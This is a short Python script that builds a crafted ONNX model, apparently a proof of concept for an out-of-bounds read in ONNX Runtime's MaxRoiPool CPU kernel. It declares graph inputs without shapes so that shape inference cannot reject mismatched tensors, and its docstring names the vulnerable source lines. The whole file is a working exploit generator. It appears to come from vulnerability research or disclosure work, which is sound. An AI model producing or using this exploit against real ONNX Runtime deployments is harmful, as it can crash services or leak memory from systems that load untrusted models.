#!/usr/bin/env python3
"""Build the malicious OrtOverrun ONNX model.

A single MaxRoiPool (opset 1) node whose graph inputs declare element types but
NO shapes. Without declared shapes, ONNX Runtime's shape inference cannot reject
rank-mismatched runtime tensors, and the CPU kernel's unvalidated TensorShape
indexing (roi_pool.cc:20-27) reads out of bounds.
"""
import os

import onnx
from onnx import TensorProto, helper

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ortoverrun.onnx")


def build(path):
    node = helper.make_node(
        "MaxRoiPool",
        ["X", "rois"],
        ["Y"],
        pooled_shape=[2, 2],
        spatial_scale=1.0,
    )
    graph = helper.make_graph(
        [node],
        "ortoverrun",
        # shape=None -> ValueInfo carries type only, no shape (the reachability key)
        [
            helper.make_tensor_value_info("X", TensorProto.FLOAT, None),
            helper.make_tensor_value_info("rois", TensorProto.FLOAT, None),
        ],
        [helper.make_tensor_value_info("Y", TensorProto.FLOAT, None)],
    )
    model = helper.make_model(
        graph,
        opset_imports=[helper.make_opsetid("", 1)],
        ir_version=8,
    )
    onnx.save(model, path)
    print(f"[+] wrote {path}")


if __name__ == "__main__":
    build(OUT)
